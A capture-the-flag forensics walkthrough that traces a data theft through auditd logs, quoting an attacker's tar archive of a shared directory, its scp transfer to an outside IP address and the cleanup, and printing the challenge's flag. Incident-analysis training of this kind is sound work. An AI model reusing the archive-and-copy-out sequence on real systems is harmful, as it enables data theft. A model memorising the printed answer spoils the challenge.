# Grhelp - Exfiltration - Walkthrough

## Challenge

**Category:** Forensics  
**Points:** 285  
**Description:** "Identifier l'outil utilisé, le chemin absolu du fichier, et l'heure de préparation des données pour l'exfiltration sur `backupfiler`."  
**Flag format:** `FCSC{tool-/absolute/path-YYYY-MM-DDTHH:MM:SS}`  
**File:** `grhelp-logs-exfil.tar.gz`

## Analysis

The archive contains 288 auditd log files spanning 2025-05-14, aggregated by a Wazuh SIEM instance. Logs originate from multiple nodes in the `jurisdefense.intra` domain: `wazuh`, `cups`, `proxy`, `backupfiler`, and others.

### Identifying the Target Node

The challenge directs attention to `backupfiler`. Filtering auditd `EXECVE` events by `node=backupfiler.jurisdefense.intra`, we enumerate all executables run on the machine. Among standard system utilities, two stand out immediately as exfiltration-capable: **`scp`** and **`wget`**.

### Locating the Exfiltration Event

```
grep -r "node=backupfiler" logs/ | grep "EXECVE" | grep -E 'a0="scp"|a0="wget"'
```

This yields a critical `scp` execution at `1747213691.971` (09:08:11 UTC):

```
node=backupfiler.jurisdefense.intra type=EXECVE msg=audit(1747213691.971:338148):
  argc=4 a0="scp" a1="/tmp/smb_share.tar.gz" a2="15.188.57.187"
```

- Executed by `goadmin` (auid=1000) from a terminal session
- CWD: `/home/goadmin`
- The PROCTITLE decodes as `bash -c scp -f /tmp/smb_share.tar.gz` - the `-f` flag is the SCP server-side "file from" mode, meaning the attacker pulled the file **from** backupfiler

### Locating the Archive Preparation

Searching for `tar` executions on `backupfiler` in the period prior to the scp, we find the archive creation at `1747213513.472` (09:05:13 UTC):

```
node=backupfiler.jurisdefense.intra type=EXECVE msg=audit(1747213513.472:338023):
  argc=4 a0="tar" a1="cvzf" a2="smb_share.tar.gz" a3="/smb_share"
CWD: /tmp
```

This command archived the entire `/smb_share` directory into `/tmp/smb_share.tar.gz`.

A legitimate backup also ran at 09:00:01 UTC:
```
tar cvzf /backups/backup_20250514090001.tar.gz /smb_share
```

The attacker's tar ran separately in `/tmp` at 09:05:13, creating `smb_share.tar.gz` for exfiltration.

The cleanup followed at 09:08:21 UTC:
```
rm smb_share.tar.gz (CWD: /tmp)
```

### Timeline

| Timestamp (UTC) | Event |
|---|---|
| 09:00:01 | Legitimate backup: `tar cvzf /backups/backup_20250514090001.tar.gz /smb_share` |
| 09:05:13 | **Attacker creates archive**: `tar cvzf smb_share.tar.gz /smb_share` (CWD: /tmp) |
| 09:08:11 | **Attacker exfiltrates**: `scp /tmp/smb_share.tar.gz 15.188.57.187` |
| 09:08:21 | Cleanup: `rm smb_share.tar.gz` (CWD: /tmp) |

## Solution

- **Exfiltration tool:** `scp` (the tool that exfiltrated the data to the C2)
- **Absolute path of exfiltrated file:** `/tmp/smb_share.tar.gz` (CWD="/tmp" + relative filename `smb_share.tar.gz` in tar command)
- **Preparation time:** `2025-05-14T09:05:13` (full ISO 8601 UTC timestamp)

### Key Steps

1. Extract and enumerate the auditd logs targeting `node=backupfiler`
2. Identify `scp` as the exfiltration transport to `15.188.57.187`
3. Trace back to the `tar` invocation creating `smb_share.tar.gz` in `/tmp`
4. Extract the precise Unix timestamp `1747213513` → `09:05:13 UTC`

## Exploit / Script

```bash
# Filter backupfiler EXECVE events for suspicious tools
grep -r "node=backupfiler" logs/ | grep "EXECVE" | grep -E 'a0="scp"|a0="tar"'

# Convert Unix timestamp to human-readable UTC
date -d @1747213513 --utc
# Output: Wed May 14 09:05:13 UTC 2025
```

## Flag

`FCSC{scp-/tmp/smb_share.tar.gz-2025-05-14T09:05:13}`
